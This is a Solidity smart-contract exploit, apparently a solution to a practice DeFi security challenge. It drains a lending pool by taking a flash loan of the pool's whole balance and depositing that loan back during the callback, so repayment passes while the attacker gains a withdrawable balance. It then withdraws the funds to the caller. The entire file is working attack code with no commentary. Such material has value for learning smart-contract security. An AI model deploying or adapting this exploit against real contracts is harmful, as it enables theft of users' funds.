// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "hardhat/console.sol";

interface IPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideExploit {
    using Address for address payable;
    IPool _pool;

    constructor(IPool _p) {
        _pool = _p;
    }

    function attack() external payable {
        uint256 b = address(_pool).balance;
        _pool.flashLoan(b);
        _pool.withdraw();
        payable(msg.sender).sendValue(b);
    }

    function execute() external payable {
        _pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
